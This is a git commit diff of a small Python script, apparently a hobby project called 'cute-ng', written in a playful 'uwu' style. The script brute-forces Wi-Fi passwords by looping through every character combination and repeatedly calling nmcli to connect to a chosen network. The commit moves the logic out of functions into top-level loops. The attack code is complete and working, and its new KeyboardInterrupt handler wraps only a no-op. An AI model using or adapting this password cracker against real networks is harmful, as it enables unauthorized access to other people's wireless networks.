64eecc388673131f4adcdb23bce2e683c111f37f
cutefemboy <lobachev.arseniy@gmail.com>
2024-12-26 16:14:38 +0500

    Change code logic for better performance

--- main.py
+++ main.py
@@ -2,33 +2,32 @@ import itertools
 import string
 import subprocess
 
-print("~Welcum to cute-ng UwU!\nP.S: It's basiclly takes something around 500 years to guess a 10 symbols password, so good luck I guess")
+subprocess.run(['nmcli', 'device', 'wifi'])
+network = input("Whick network to crack? (Enter full network name): ")
 
-def network_searcher():
-    subprocess.run(['nmcli', 'device', 'wifi'])
-    network = input("Whick network to crack? (Enter full network name): ")
-    return network
+charset = string.ascii_lowercase
+min_length = int(input("Minyamal passuwurd lenght? (Enter int valuwue): "))
+max_length = int(input("Maximal passuwurd lenght? (Enter int valuwue): "))
 
-def password_guesser(network):
-    charset = string.ascii_lowercase + string.digits + string.ascii_uppercase
-    min_length = int(input("Minyamal passuwurd lenght? (Enter int valuwue): "))
-    max_length = int(input("Maximal passuwurd lenght? (Enter int valuwue): "))
-
-    for length in range(min_length, max_length + 1):
-        for guess in itertools.product(charset, repeat=length):
-            guess_password = ''.join(guess)
-            print(f'Tryaing passuwurd... {guess_password}')
-            
-            result = subprocess.run(['nmcli', 'device', 'wifi', 'connect', network, 'password', guess_password], 
-                                    text=True, capture_output=True)
-            
-            if "successfully" in result.stdout:
-                print(f'Passuwurd was fouwund: {guess_password}! ^~^')
-                return guess_password
-
+for length in range(min_length, max_length + 1):
+    for guess in itertools.product(charset, repeat=length):
+        guess_password = ''.join(guess)
+        print(f'Tryaing passuwurd... {guess_password}')
+        
+        result = subprocess.run(['nmcli', 'device', 'wifi', 'connect', network, 'password', guess_password], 
+                                text=True, capture_output=True)
+        
+        if "successfully" in result.stdout:
+            print(f'Passuwurd was fouwund: {guess_password}! ^~^')
+            break
+    else:
+        continue
+    break
+else:
     print("Passuwurd not fouwund... >~<")
-    return None
 
-if __name__ == "__main__":
-    network = network_searcher()
-    password_guesser(network)
+try:
+    if __name__ == "__main__":
+        pass
+except KeyboardInterrupt:
+    print("bye...")
